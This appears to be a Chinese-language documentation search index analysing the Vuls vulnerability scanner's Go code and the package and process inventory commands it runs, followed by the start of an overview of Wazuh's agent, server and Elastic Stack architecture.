o.grepProcMap(pid)\n        ...\n        ss := o.parseGrepProcMap(stdout)\n        pidLoadedFiles[pid] = append(pidLoadedFiles[pid], ss...)\n    }\n\n\n    pidListenPorts := map[string][]string{}\n    stdout, err = o.lsOfListen()\n    ...\n    portPid := o.parseLsOf(stdout)\n    for port, pid := range portPid {\n        pidListenPorts[pid] = append(pidListenPorts[pid], port)\n    }\n\n\n    for pid, loadedFiles := range pidLoadedFiles {\n        o.log.Debugf(\"dpkg -S %#v\", loadedFiles)\n        pkgNames, err := o.getPkgName(loadedFiles)\n        ...\n        procName := \"\"\n        if _, ok := pidNames[pid]; ok {\n            procName = pidNames[pid]\n        }\n        proc := models.AffectedProcess{\n            PID:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0pid,\n            Name:\u00a0 \u00a0 \u00a0 \u00a0 procName,\n            ListenPorts: pidListenPorts[pid],\n        }\n        for _, n := range pkgNames {\n            p, ok := o.Packages[n]\n            ...\n            p.AffectedProcs = append(p.AffectedProcs, proc)\n            o.Packages[p.Name] = p\n        }\n    }\n    return nil\n}\n\n\n\n\npostScan \u51fd\u6570\u8c03\u7528\u7684\u5b50\u51fd\u6570\u4e3b\u8981\u6267\u884c\u4e86\u4e0b\u9762\u7684\u547d\u4ee4\uff1a\n\n\nLANGUAGE=en_US.UTF-8 ps --no-headers --ppid 2 -p 2 --deselect -o pid,comm\n\u6267\u884cps\u547d\u4ee4\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a pid\u00a0 processname\nroot@ubuntu:/var/ossec/bin# ps --no-headers --ppid 2 -p 2 --deselect -o pid,comm\u00a0 \u00a0 \u00a0\n   1 systemd\n\u00a0 \u00a0419 systemd-journal\n\u00a0 \u00a0460 systemd-udevd\n\u00a0  ...\n\n\nls -l /proc/%s/exe\", pid\n\u83b7\u5f97\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\n`cat /proc/%s/maps 2>/dev/null | grep -v \" 00:00 \" | awk '{print $6}' | sort -n | uniq`, pid\n\u4ece\u8fdb\u7a0b\u7684\u5185\u5b58map\u4e2d\u63d0\u53d6\u52a0\u8f7d\u7684\u6587\u4ef6\nls -i -P -n|grep LISTEN \n\u83b7\u53d6\u6b63\u5728\u76d1\u542c\u7f51\u7edc\u7aef\u53e3\u7684\u8fdb\u7a0b\u7684PID\u548c\u76d1\u542c\u7684\u7aef\u53e3\u53f7\ndpkg -S paths  \n\u83b7\u53d6\u6587\u4ef6\u5bf9\u5e94\u7684package\u4fe1\u606f\n\n\n\n\nscanPackage\u7684\u4e3b\u8981\u6267\u884c\u51fd\u6570\n\n\nscanPackages -> scanInstalledPackages \n\n\nconst dpkgQuery = `dpkg-query -W -f=\"\\${binary:Package},\\${db:Status-Abbrev},\\${Version},\\${Source},\\${source:Version}\\n\"`\n\n\nfunc (o *debian) scanInstalledPackages() (models.Packages, models.Packages, models.SrcPackages, error) {\n    updatable := models.Packages{}\n    r := o.exec(dpkgQuery, noSudo)\n    ...\n    installed, srcPacks, err := o.parseInstalledPackages(r.Stdout)\n    ...\n    updatableNames, err := o.getUpdatablePackNames()\n    ...\n    for _, name := range updatableNames {\n        for _, pack := range installed {\n            if pack.Name == name {\n                updatable[name] = pack\n                break\n            }\n        }\n    }\n    // Fill the candidate versions of upgradable packages\n    err = o.fillCandidateVersion(updatable)\n    ...\n    installed.MergeNewVersion(updatable)\n    return installed, updatable, srcPacks, nil\n}\n\n\n\n\nscanInstalledPackages\u51fd\u6570\u4e3b\u8981\u662f\u901a\u8fc7\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4\u83b7\u53d6\u7cfb\u7edf\u5b89\u88c5\u7684package\u5e76\u5bf9\u7ed3\u679c\u89e3\u6790\n\n\nroot@ubuntu:/var/ossec/bin# dpkg-query -W -f=\"\\${binary:Package},\\${db:Status-Abbrev},\\${Version},\\${Source},\\${source:Version}\\n\"\naccountsservice,ii ,0.6.45-1ubuntu1,,0.6.45-1ubuntu1\nacl,ii ,2.2.52-3build1,,2.2.52-3build1\nacpi-support,ii ,0.142,,0.142\nacpid,ii ,1:2.0.28-1ubuntu1,,1:2.0.28-1ubuntu1\n...\n\n\n\n\nscanPackages -> scanUnsecurePackages -> scanChangelogs ->  getChangelogCache -> \nfetchParseChangelog\n -> getCveIDsFromChangelog -> \u00a0\nparseChangelog\n\n\n\nfunc (o *debian) fetchParseChangelog(pack models.Package) ([]DetectedCveID, *models.Package, error) {\n    cmd := \"\"\n    switch o.Distro.Family {\n    case config.Ubuntu, config.Raspbian:\n        cmd = fmt.Sprintf(`PAGER=cat apt-get -q=2 changelog %s`, pack.Name)\n    case config.Debian:\n        cmd = fmt.Sprintf(`PAGER=cat aptitude -q=2 changelog %s`, pack.Name)\n    }\n    ...\n    r := o.exec(cmd, noSudo)\n    ...\n    cveIDs, clogFilledPack := o.getCveIDsFromChangelog(stdout, pack.Name, pack.Version)\n    ...\n    return cveIDs, clogFilledPack, nil\n}\n\nvar cveRe = regexp.MustCompile(`(CVE-\\d{4}-\\d{4,})`)\n\nfunc (o *debian) parseChangelog(changelog, name, ver string, confidence models.Confidence) ([]DetectedCveID, *models.Package, error) {\n    ...\n    buf, cveIDs := []string{}, []string{}\n    scanner := bufio.NewScanner(strings.NewReader(changelog))\n    found := false\n    for scanner.Scan() {\n        line := scanner.Text()\n        buf = append(buf, line)\n        if matches := cveRe.FindAllString(line, -1); 0 < len(matches) {\n            for _, m := range matches {\n                cveIDs = util.AppendIfMissing(cveIDs, m)\n            }\n        }\n        ...\n    }\n    ...\n    pack := o.Packages[name]\n    pack.Changelog = clog\n\n    cves := []DetectedCveID{}\n    for _, id := range cveIDs {\n        cves = append(cves, DetectedCveID{id, confidence})\n    }\n\n    return cves, &pack, nil\n\n\n\n\n}\n\n\nfetchParseChangelog \u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u83b7\u53d6package\u7684changelog\n\n\nPAGER=cat apt-get -q=2 changelog pack.Name\n\n\n\n\nparseChangelog \u51fd\u6570\u5bf9changelog\u505a\u6b63\u5219\u5339\u914d\u63d0\u53d6\u76f8\u5173\u7684\u6f0f\u6d1e\u4fe1\u606f\n\n\nscanWordPress\u4e3b\u8981\u6267\u884c\u51fd\u6570\n\n\nfunc (l *base) detectWordPress() (*models.WordPressPackages, error) {\n    ver, err := l.detectWpCore()\n    ...\n    themes, err := l.detectWpThemes()\n    ...\n    plugins, err := l.detectWpPlugins()\n    ...\n    pkgs := models.WordPressPackages{\n        models.WpPackage{\n            Name:\u00a0 \u00a0 models.WPCore,\n            Version: ver,\n            Type:\u00a0 \u00a0 models.WPCore,\n        },\n    }\n    pkgs = append(pkgs, themes...)\n    pkgs = append(pkgs, plugins...)\n    return &pkgs, nil\n}\n\n\n\n\n\u4e3b\u8981\u6267\u884c\u4e86\u4e0b\u9762\u51e0\u4e2a\u547d\u4ee4:\n\n\n\"sudo -u osuser -i -- /path/to/wp core version --path=DocRoot --allow-root\"\n\u83b7\u53d6wp\u7684\u7248\u672c\u4fe1\u606f\n\"sudo -u osuser -i -- /path/to/wp theme list --path=DocRoot --format=json --allow-root 2>/dev/null\"\n\u83b7\u53d6wp theme\u5217\u8868\n\"sudo -u osuser -i -- /path/to/wp plugin list --path=DocRoot --format=json --allow-root 2>/dev/null\"\n\u83b7\u53d6wp theme\u5217\u8868\n\n\n\n\n5.\u7279\u70b9\u5206\u6790\n\n\n\n\n\u6838\u5fc3\u529f\u80fd\uff1a\u6f0f\u6d1e\u626b\u63cf\uff0c\u4e3b\u8981\u662f\u4f9d\u636epackage\u7684changelog\u4e2d\u63d0\u4f9b\u7684\u4fe1\u606f\u6765\u5224\u65ad\u4e3b\u673a\u5b89\u88c5\u7684package\u7248\u672c\u662f\u5426\u6709\u6f0f\u6d1e\uff0c\u7136\u540e\u901a\u8fc7\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u4e2d\u63d0\u53d6\u4f9d\u8d56\u7684\u5305\u6765\u5224\u65ad\u662f\u5426\u6709\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53d7\u5230\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002\n\n\n\u6269\u5c55\u6027\u65b9\u9762: \u53ef\u4ee5\u901a\u8fc7\u589e\u52a0\u5e93\u6587\u4ef6\u7684\u65b9\u5f0f\u6269\u5c55\uff0c\u4f46\u9700\u8981\u540c\u65f6\u4fee\u6539\u6838\u5fc3\u6587\u4ef6\uff0c\u8026\u5408\u6027\u6bd4\u8f83\u9ad8",
            "title": "Vuls\u5206\u6790"
        },
        {
            "location": "/vuls\u5206\u6790/#vuls",
            "text": "",
            "title": "Vuls\u5206\u6790"
        },
        {
            "location": "/vuls\u5206\u6790/#1",
            "text": "vulns\u662f\u4e00\u4e2a\u57fa\u4e8ego\u8bed\u8a00\u7684\u5f00\u6e90\u6f0f\u6d1e\u626b\u63cf\u9879\u76ee\uff0c\u5b83\u80fd\u5bf9\u76ee\u6807\u4e3b\u673a\u7684\u5b89\u88c5\u5305\u3001\u5e93\u6587\u4ef6\u8fdb\u884c\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u53e6\u5916\u8fd8\u652f\u6301Wordpress\u6f0f\u6d1e\u68c0\u6d4b\u3002",
            "title": "1. \u7b80\u4ecb"
        },
        {
            "location": "/vuls\u5206\u6790/#2",
            "text": "Vuln\u7684\u67b6\u6784\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u6a21\u5757\uff1a\u626b\u63cf\u6a21\u5757\uff0c\u6570\u636e\u5e93\u6a21\u5757\uff0c\u62a5\u544a\u751f\u6210\u6a21\u5757\u3002   \u626b\u63cf\u6a21\u5757\u5305\u542b\uff1ascanPackages\u3001postScan\u3001scanWordPress\u3001scanLibraries\u51e0\u5927\u529f\u80fd\u3002  \u6570\u636e\u5e93\u6a21\u5757\uff1a\u4e3b\u8981\u662f\u5b58\u50a8\u6f0f\u6d1e\u5e93\uff0c\u7528\u4e8e\u751f\u6210\u62a5\u544a\u3002  \u62a5\u544a\u751f\u6210\u6a21\u5757\uff1a\u6839\u636e\u626b\u63cf\u6a21\u5757\u7684\u7ed3\u679c\uff0c\u7ed3\u5408\u6f0f\u6d1e\u6570\u636e\u5e93\u7684\u4fe1\u606f\u751f\u6210\u62a5\u544a\u3002",
            "title": "2. \u67b6\u6784\u6982\u8ff0"
        },
        {
            "location": "/vuls\u5206\u6790/#3",
            "text": "scanPackages  \u901a\u8fc7\u6267\u884cdpkg\uff0capt-get\u7b49\u547d\u4ee4\uff0c\u83b7\u53d6\u7cfb\u7edf\u7684\u6240\u6709\u5b89\u88c5\u5305\uff0c\u5e76\u901a\u8fc7\u62c9\u53d6\u8f6f\u4ef6\u5305changelog\uff0c\u4ee5\u6b63\u5219\u5339\u914d\u7684\u65b9\u5f0f\u63d0\u53d6\u5176\u4e2d\u7684\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f\u3002  postScan  \u641c\u96c6\u5b89\u88c5\u7684packages\u5bf9\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684\u5f71\u54cd\u3002  \u901a\u8fc7\u6267\u884cshell\u6307\u4ee4\uff0c\u8bfb\u53d6/proc/pid/\u76ee\u5f55\u4e0b\u7684\u6570\u636e\uff0c\u83b7\u53d6\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u5217\u8868\u3001\u8fdb\u7a0b\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6587\u4ef6\uff0c\u8fdb\u800c\u83b7\u53d6\u8fdb\u7a0b\u52a0\u8f7d\u7684package\u4fe1\u606f\uff0c\u7136\u540e\u6839\u636e\u5305\u540d\u5b8c\u5584scanPackages\u9636\u6bb5\u83b7\u53d6\u7684base.Packages\u5b57\u5178\u7684\u4fe1\u606f\uff0c\u8865\u5145Package\u5bf9\u8c61\u7684AffectedProcs\u5b57\u6bb5\uff0c\u5373\u8be5package\u5f71\u54cd\u7684\u8fdb\u7a0b\u3002  scanWordPress  \u4e3b\u8981\u662f\u901a\u8fc7\u6267\u884cwp\u547d\u4ee4\u83b7\u53d6Wordpress \u7248\u672c\u4fe1\u606f\uff0c\u5b89\u88c5\u7684\u4e3b\u9898\u76f8\u5173\u4fe1\u606f\uff0c\u5b89\u88c5\u7684\u63d2\u4ef6\u76f8\u5173\u4fe1\u606f\u3002  scanLibraries  \u57fa\u4e8e\u00a0aquasecurity\u9879\u76ee\u63d0\u4f9b\u7684fanal\u7b49\u5f00\u6e90\u5e93\u5bf9python\u3001ruby\u3001rust\u3001php\u3001node\u8bed\u8a00\u7684\u5de5\u7a0b\u9879\u76ee\u4e2d\u7684\u4f9d\u8d56\u5305\u4e2d\u63d0\u53d6\u4f9d\u8d56\u7684\u5e93\uff0c\u6839\u636e\u63d0\u53d6\u7684\u4fe1\u606f\u5339\u914d\u6f0f\u6d1e\u5e93\u5224\u65ad\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002",
            "title": "3.\u529f\u80fd\u63cf\u8ff0"
        },
        {
            "location": "/vuls\u5206\u6790/#4",
            "text": "",
            "title": "4.\u4ee3\u7801\u5206\u6790"
        },
        {
            "location": "/vuls\u5206\u6790/#41",
            "text": "",
            "title": "4.1 \u4ee3\u7801\u67b6\u6784"
        },
        {
            "location": "/vuls\u5206\u6790/#42",
            "text": "\u6838\u5fc3\u7684\u626b\u63cf\u903b\u8f91  func GetScanResults(scannedAt time.Time, timeoutSec int) (results models.ScanResults, err error) {\n    parallelExec(func(o osTypeInterface) (err error) {\n        if !(config.Conf.LibsOnly || config.Conf.WordPressOnly) {\n            if err = o.preCure(); err != nil {\n                return err\n            }\n            if err = o.scanPackages(); err != nil {\n                return err\n            }\n            if err = o.postScan(); err != nil {\n                return err\n            }\n        }\n        if err = o.scanWordPress(); err != nil {\n            return xerrors.Errorf(\"Failed to scan WordPress: %w\", err)\n        }\n        if err = o.scanLibraries(); err != nil {\n            return xerrors.Errorf(\"Failed to scan Library: %w\", err)\n        }\n        return nil\n    }, timeoutSec)\n...  postScan\u7684\u4e3b\u8981\u6267\u884c\u51fd\u6570  func (o *debian) dpkgPs() error {\n    stdout, err := o.ps()\n    ...\n    pidNames := o.parsePs(stdout)\n    pidLoadedFiles := map[string][]string{}\n\n\n    for pid := range pidNames {\n        ...\n        stdout, err = o.lsProcExe(pid)\n        ...\n        s, err := o.parseLsProcExe(stdout)\n        ...\n        pidLoadedFiles[pid] = append(pidLoadedFiles[pid], s)\n        stdout, err = o.grepProcMap(pid)\n        ...\n        ss := o.parseGrepProcMap(stdout)\n        pidLoadedFiles[pid] = append(pidLoadedFiles[pid], ss...)\n    }\n\n\n    pidListenPorts := map[string][]string{}\n    stdout, err = o.lsOfListen()\n    ...\n    portPid := o.parseLsOf(stdout)\n    for port, pid := range portPid {\n        pidListenPorts[pid] = append(pidListenPorts[pid], port)\n    }\n\n\n    for pid, loadedFiles := range pidLoadedFiles {\n        o.log.Debugf(\"dpkg -S %#v\", loadedFiles)\n        pkgNames, err := o.getPkgName(loadedFiles)\n        ...\n        procName := \"\"\n        if _, ok := pidNames[pid]; ok {\n            procName = pidNames[pid]\n        }\n        proc := models.AffectedProcess{\n            PID:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0pid,\n            Name:\u00a0 \u00a0 \u00a0 \u00a0 procName,\n            ListenPorts: pidListenPorts[pid],\n        }\n        for _, n := range pkgNames {\n            p, ok := o.Packages[n]\n            ...\n            p.AffectedProcs = append(p.AffectedProcs, proc)\n            o.Packages[p.Name] = p\n        }\n    }\n    return nil\n}  postScan \u51fd\u6570\u8c03\u7528\u7684\u5b50\u51fd\u6570\u4e3b\u8981\u6267\u884c\u4e86\u4e0b\u9762\u7684\u547d\u4ee4\uff1a  LANGUAGE=en_US.UTF-8 ps --no-headers --ppid 2 -p 2 --deselect -o pid,comm\n\u6267\u884cps\u547d\u4ee4\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a pid\u00a0 processname\nroot@ubuntu:/var/ossec/bin# ps --no-headers --ppid 2 -p 2 --deselect -o pid,comm\u00a0 \u00a0 \u00a0\n   1 systemd\n\u00a0 \u00a0419 systemd-journal\n\u00a0 \u00a0460 systemd-udevd\n\u00a0  ...\n\n\nls -l /proc/%s/exe\", pid\n\u83b7\u5f97\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\n`cat /proc/%s/maps 2>/dev/null | grep -v \" 00:00 \" | awk '{print $6}' | sort -n | uniq`, pid\n\u4ece\u8fdb\u7a0b\u7684\u5185\u5b58map\u4e2d\u63d0\u53d6\u52a0\u8f7d\u7684\u6587\u4ef6\nls -i -P -n|grep LISTEN \n\u83b7\u53d6\u6b63\u5728\u76d1\u542c\u7f51\u7edc\u7aef\u53e3\u7684\u8fdb\u7a0b\u7684PID\u548c\u76d1\u542c\u7684\u7aef\u53e3\u53f7\ndpkg -S paths  \n\u83b7\u53d6\u6587\u4ef6\u5bf9\u5e94\u7684package\u4fe1\u606f  scanPackage\u7684\u4e3b\u8981\u6267\u884c\u51fd\u6570  scanPackages -> scanInstalledPackages   const dpkgQuery = `dpkg-query -W -f=\"\\${binary:Package},\\${db:Status-Abbrev},\\${Version},\\${Source},\\${source:Version}\\n\"`\n\n\nfunc (o *debian) scanInstalledPackages() (models.Packages, models.Packages, models.SrcPackages, error) {\n    updatable := models.Packages{}\n    r := o.exec(dpkgQuery, noSudo)\n    ...\n    installed, srcPacks, err := o.parseInstalledPackages(r.Stdout)\n    ...\n    updatableNames, err := o.getUpdatablePackNames()\n    ...\n    for _, name := range updatableNames {\n        for _, pack := range installed {\n            if pack.Name == name {\n                updatable[name] = pack\n                break\n            }\n        }\n    }\n    // Fill the candidate versions of upgradable packages\n    err = o.fillCandidateVersion(updatable)\n    ...\n    installed.MergeNewVersion(updatable)\n    return installed, updatable, srcPacks, nil\n}  scanInstalledPackages\u51fd\u6570\u4e3b\u8981\u662f\u901a\u8fc7\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4\u83b7\u53d6\u7cfb\u7edf\u5b89\u88c5\u7684package\u5e76\u5bf9\u7ed3\u679c\u89e3\u6790  root@ubuntu:/var/ossec/bin# dpkg-query -W -f=\"\\${binary:Package},\\${db:Status-Abbrev},\\${Version},\\${Source},\\${source:Version}\\n\"\naccountsservice,ii ,0.6.45-1ubuntu1,,0.6.45-1ubuntu1\nacl,ii ,2.2.52-3build1,,2.2.52-3build1\nacpi-support,ii ,0.142,,0.142\nacpid,ii ,1:2.0.28-1ubuntu1,,1:2.0.28-1ubuntu1\n...  scanPackages -> scanUnsecurePackages -> scanChangelogs ->  getChangelogCache ->  fetchParseChangelog  -> getCveIDsFromChangelog -> \u00a0 parseChangelog  \nfunc (o *debian) fetchParseChangelog(pack models.Package) ([]DetectedCveID, *models.Package, error) {\n    cmd := \"\"\n    switch o.Distro.Family {\n    case config.Ubuntu, config.Raspbian:\n        cmd = fmt.Sprintf(`PAGER=cat apt-get -q=2 changelog %s`, pack.Name)\n    case config.Debian:\n        cmd = fmt.Sprintf(`PAGER=cat aptitude -q=2 changelog %s`, pack.Name)\n    }\n    ...\n    r := o.exec(cmd, noSudo)\n    ...\n    cveIDs, clogFilledPack := o.getCveIDsFromChangelog(stdout, pack.Name, pack.Version)\n    ...\n    return cveIDs, clogFilledPack, nil\n}\n\nvar cveRe = regexp.MustCompile(`(CVE-\\d{4}-\\d{4,})`)\n\nfunc (o *debian) parseChangelog(changelog, name, ver string, confidence models.Confidence) ([]DetectedCveID, *models.Package, error) {\n    ...\n    buf, cveIDs := []string{}, []string{}\n    scanner := bufio.NewScanner(strings.NewReader(changelog))\n    found := false\n    for scanner.Scan() {\n        line := scanner.Text()\n        buf = append(buf, line)\n        if matches := cveRe.FindAllString(line, -1); 0 < len(matches) {\n            for _, m := range matches {\n                cveIDs = util.AppendIfMissing(cveIDs, m)\n            }\n        }\n        ...\n    }\n    ...\n    pack := o.Packages[name]\n    pack.Changelog = clog\n\n    cves := []DetectedCveID{}\n    for _, id := range cveIDs {\n        cves = append(cves, DetectedCveID{id, confidence})\n    }\n\n    return cves, &pack, nil  }  fetchParseChangelog \u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u83b7\u53d6package\u7684changelog  PAGER=cat apt-get -q=2 changelog pack.Name  parseChangelog \u51fd\u6570\u5bf9changelog\u505a\u6b63\u5219\u5339\u914d\u63d0\u53d6\u76f8\u5173\u7684\u6f0f\u6d1e\u4fe1\u606f  scanWordPress\u4e3b\u8981\u6267\u884c\u51fd\u6570  func (l *base) detectWordPress() (*models.WordPressPackages, error) {\n    ver, err := l.detectWpCore()\n    ...\n    themes, err := l.detectWpThemes()\n    ...\n    plugins, err := l.detectWpPlugins()\n    ...\n    pkgs := models.WordPressPackages{\n        models.WpPackage{\n            Name:\u00a0 \u00a0 models.WPCore,\n            Version: ver,\n            Type:\u00a0 \u00a0 models.WPCore,\n        },\n    }\n    pkgs = append(pkgs, themes...)\n    pkgs = append(pkgs, plugins...)\n    return &pkgs, nil\n}  \u4e3b\u8981\u6267\u884c\u4e86\u4e0b\u9762\u51e0\u4e2a\u547d\u4ee4:  \"sudo -u osuser -i -- /path/to/wp core version --path=DocRoot --allow-root\"\n\u83b7\u53d6wp\u7684\u7248\u672c\u4fe1\u606f\n\"sudo -u osuser -i -- /path/to/wp theme list --path=DocRoot --format=json --allow-root 2>/dev/null\"\n\u83b7\u53d6wp theme\u5217\u8868\n\"sudo -u osuser -i -- /path/to/wp plugin list --path=DocRoot --format=json --allow-root 2>/dev/null\"\n\u83b7\u53d6wp theme\u5217\u8868",
            "title": "4.2 \u4ee3\u7801\u5206\u6790"
        },
        {
            "location": "/vuls\u5206\u6790/#5",
            "text": "\u6838\u5fc3\u529f\u80fd\uff1a\u6f0f\u6d1e\u626b\u63cf\uff0c\u4e3b\u8981\u662f\u4f9d\u636epackage\u7684changelog\u4e2d\u63d0\u4f9b\u7684\u4fe1\u606f\u6765\u5224\u65ad\u4e3b\u673a\u5b89\u88c5\u7684package\u7248\u672c\u662f\u5426\u6709\u6f0f\u6d1e\uff0c\u7136\u540e\u901a\u8fc7\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u4e2d\u63d0\u53d6\u4f9d\u8d56\u7684\u5305\u6765\u5224\u65ad\u662f\u5426\u6709\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53d7\u5230\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002  \u6269\u5c55\u6027\u65b9\u9762: \u53ef\u4ee5\u901a\u8fc7\u589e\u52a0\u5e93\u6587\u4ef6\u7684\u65b9\u5f0f\u6269\u5c55\uff0c\u4f46\u9700\u8981\u540c\u65f6\u4fee\u6539\u6838\u5fc3\u6587\u4ef6\uff0c\u8026\u5408\u6027\u6bd4\u8f83\u9ad8",
            "title": "5.\u7279\u70b9\u5206\u6790"
        },
        {
            "location": "/wazuh\u5206\u6790/",
            "text": "wazuh\u5206\u6790\n\n\n1.\u7b80\u4ecb\n\n\nWazuh\u662f\u4e00\u4e2a\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u7cfb\u7edf\u5b89\u5168\u68c0\u6d4b\u5e73\u53f0\uff0c\u5b83\u662f\u57fa\u4e8e\u53e6\u4e00\u4e2a\u5f00\u6e90\u9879\u76eeOSSEC HIDS\u53d1\u5c55\u51fa\u6765\u7684\uff0c\u5728OSSEC\u7684\u57fa\u7840\u4e0a\u96c6\u6210\u4e86Elastic Stack\u548cOpenSCAP\uff0c\u5e76\u589e\u52a0\u4e86\u5f88\u591a\u65b0\u7684\u7279\u6027\uff0c\u529f\u80fd\u66f4\u52a0\u5168\u9762\u3002\n\n\n2.\u67b6\u6784\u6982\u8ff0\n\n\nWazuh\u7684\u67b6\u6784\u7531Agent\u3001Server\u3001Elastic Stack\u4e09\u5927\u90e8\u5206\u7ec4\u6210\u3002\n\n\n2.1 Agent\n\n\nAgent\u4e3b\u8981\u529f\u80fd\uff1a\n\n\n\n\n\u8fd0\u884c\u5728\u88ab\u76d1\u63a7\u7684\u7ec8\u7aef\u673a\u5668(Monitored Endpoint)\uff0c\u652f\u6301Windows\u3001Linux\u3001Solaris, BSD,  Mac\u7cfb\u7edf\u3002\u6536\u96c6\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\uff0c\u5e76\u53d1\u9001\u5230Wazuh server\u3002\n\n\n\u53e6\u5916\uff0c\u672a\u5b89\u88c5Agent\u7684\u8bbe\u5907(Agentless devices, \u9632\u706b\u5899\uff0c\u8def\u7531\u5668\uff0c\u4ea4\u6362\u673a\u7b49)\uff0c\u4e5f\u53ef\u4ee5\u5411Wazuh server\u53d1\u9001\u65e5\u5fd7\u548c\u914d\u7f6e\u4fe1\u606f\u4f9b\u5176\u5206\u6790\u3002\n\n\n\n\nAgent\u5305\u542b\u7684\u5b50\u6a21\u5757\uff1a\n\n\n\n\nRootcheck  rootkit\u68c0\u6d4b\u3001\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u3001\u7cfb\u7edf\u5f02\u5e38\u68c0\u6d4b\u3001\u7cfb\u7edf\u914d\u7f6e\u5b89\u5168\u68c0\u67e5\n\n\nLog Collector  \u8bfb\u53d6\u7cfb\u7edf\u65e5\u5fd7\u3001\u5e94\u7528\u65e5\u5fd7\u3001\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u7b49\u3002\n\n\nSyscheck  \u6587\u4ef6\u5b8c\u6574\u6027\u68c0\u67e5(FIM)\u3001Windows\u6ce8\u518c\u8868\u76d1\u63a7\u7b49\u3002\n\n\nOpenSCAP  \u626b\u63cf\u7cfb\u7edf\uff0c\u5bfb\u627e\u4e0d\u7b26\u5408OVAL\u3001XCCDF\u3001CIS benchmarks\u7b49\u6807\u51c6\u7684\u8f6f\u4ef6\u6f0f\u6d1e\u3001\u7cfb\u7edf\u914d\u7f6e\n\n\nAgent Daemon  \u7528\u4e8e\u6c47\u603b\u5176\u4ed6\u7ec4\u4ef6\u7684\u7ed3\u679c\u3001\u538b\u7f29\u52a0\u5bc6\u53d1\u9001\u5230Wazuh server\u3002\u8fd0\u884c\u5728chroot\u3001\u662fAgent\u552f\u4e00\u8981\u8054\u7f51\u7684\u7ec4\u4ef6\u3002\n\n\n\n\n2.2\n  Server\n\n\n\u4e3b\u8981\u529f\u80fd: \u63a5\u6536Agent\u4f20\u8f93\u7684\u6570\u636e\uff0c\u5206\u6790\u6570\u636e\uff0c\u4ea7\u751f\u8b66\u62a5\uff0c\u8fd8\u5305\u62ec\u901a\u4fe1\u52a0\u5bc6\uff0cAgent\u7684\u8ba4\u8bc1\u7b49\u529f\u80fd\u3002\n\n\nServer\u5305\u542b\u7684\u5b50\u6a21\u5757:\n\n\n\n\nRegistration service \u7528\u4e8e\u6ce8\u518c\u548c\u8ba4\u8bc1Agents\n\n\nRemote daemon service \u7528\u6765\u63a5\u6536Agents\u4e0a\u4f20\u7684\u6570\u636e\n\n\nAnalysis daemon \u5206\u6790\u5404\u79cd\u683c\u5f0f\u6570\u636e\u3001\u5339\u914d\u89c4\u5219\u3001\u4ea7\u751f\u8b66\u62a5\u7b49\n\n\nRESTful API \u63d0\u4f9b\u7ba1\u7406\u3001\u914d\u7f6eAgents\uff0c\u67e5\u770bAgents\u72b6\u6001\u7684\u63a5\u53e3\uff0c\u4ee5\u53caKibana\u53ef\u89c6\u5316\u9700\u8981\u7684\u63a5\u53e3\n\n\n\n\n2.3\n Elastic Stack\n\n\n\u5305\u62ecElasticsearch\u3001Kibana\u3001Logstash\u7b49\u5957\u4ef6\uff0c\u7528\u6765\u5904\u7406Server\u6536\u96c6\u5230\u7684\u6240\u6709\u6570\u636e\u3002\n\n\n\n\nElasticsearch \u7528\u4e8e\u5168\u6587\u68c0\u7d22\n\n\nLogstach \u5904\u7406\u65e5\u5fd7\u6570\u636e\n\n\nKibana \u7528\u4e8eWeb\u53ef\u89c6\u5316\n\n\nFilebeat \u7528\u4e8e\u65e5\u5fd7\u6570\u636e\u7684\u4f20\u8f93\n\n\n\n\n2.4 \u6a21\u5757\u95f4\u901a\u4fe1\n\n\n2.4.1 MessageQueue\n\n\n\u5404\u4e2a\u6a21\u5757\u4f1a\u901a\u8fc7Unix-domain socket\u7ed1\u5b9a\u5230\u6587\u4ef6\u4f5c\u4e3a\u6d88\u606f\u961f\u5217\u6765\u8fdb\u884c\u8fdb\u7a0b\u95f4\u901a\u4fe1Agent\u7684MQ\u4f4d\u4e8e/var/ossec/queue\u76ee\u5f55\u4e0b\n\n\n3.\u5177\u4f53\u529f\u80fd\n\n\n3.1 \u529f\u80fd\u5217\u8868\n\n\n\n\n\u65e5\u5fd7\u6536\u96c6(Log data collection)\n\n\n\n\n\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\uff0c\u914d\u7f6e\u5177\u4f53\u8981\u76d1\u63a7\u7684\u65e5\u5fd7\u6587\u4ef6\n\n\n\n\n\u6587\u4ef6\u5b8c\u6574\u6027\u76d1\u63a7(FIM, File integrity monitoring)   